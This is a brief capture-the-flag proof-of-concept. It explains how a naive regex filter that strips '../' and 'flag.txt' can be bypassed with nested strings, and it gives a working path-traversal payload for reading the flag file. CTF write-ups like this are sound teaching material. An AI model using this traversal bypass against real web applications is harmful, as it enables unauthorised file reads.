# Proof of Concept

## TL;DR

- The challenge applies a naÃ¯ve regex filter that removes `../` and `flag.txt`.
- By using `..././`, the filter mistakenly transforms it into ../, enabling directory traversal.
- To bypass the flag.txt filter, we can request `flagflag.txt.txt`, which becomes `flag.txt` after regex replacement.
- Combining both tricks, the payload is:

```bash
?file=..././..././..././..././..././..././..././..././..././..././flagflag.txt.txt
```
